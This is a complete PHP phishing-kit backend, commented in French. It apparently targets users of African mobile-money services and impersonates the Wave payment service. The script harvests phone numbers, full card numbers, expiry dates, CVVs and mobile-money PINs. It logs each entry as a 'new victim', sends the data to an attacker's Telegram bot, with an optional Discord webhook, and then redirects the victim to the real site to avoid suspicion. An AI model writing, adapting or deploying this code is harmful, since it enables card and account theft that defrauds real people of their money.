<?php
// Récupération des données
$phone = $_POST['phone'];
$amount = $_POST['amount'];
$card = preg_replace('/\s+/', '', $_POST['card_number']);
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];
$pin = $_POST['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
$agent = $_SERVER['HTTP_USER_AGENT'];

// Formatage
$data = "==================================\n";
$data .= "💸 [AFRICASH] NOUVELLE VICTIME\n";
$data .= "📞 Tel : $phone\n";
$data .= "💰 Montant : $amount FCFA\n";
$data .= "💳 Carte : $card | $exp | $cvv\n";
$data .= "🔐 PIN MM : $pin\n";
$data .= "📍 IP : $ip\n";
$data .= "📤 Ref : $referer\n";
$data .= "📱 Agent : $agent\n";
$data .= "⏰ " . date('Y-m-d H:i:s') . "\n";
$data .= "==================================\n\n";

// Sauvegarde 1 : Fichier local (caché)
file_put_contents('logs.txt', $data, FILE_APPEND);

// Sauvegarde 2 : Telegram (instantané)
$bot_token = "TON_BOT_TELEGRAM"; // Ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
$chat_id = "TON_CHAT_ID"; // Ex: 123456789
$message = urlencode($data);
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message&disable_web_page_preview=true");

// Sauvegarde 3 : Webhook Discord (optionnel)
// $webhook = "https://discord.com/api/webhooks/...";
// $json = json_encode(['content' => $data]);
// @file_get_contents($webhook, false, stream_context_create(['http'=>['method'=>'POST','header'=>'Content-Type: application/json','content'=>$json]]));

// Rediriger vers vrai site (pas de suspicion)
header("Location: https://www.wave.com");
exit();
?>
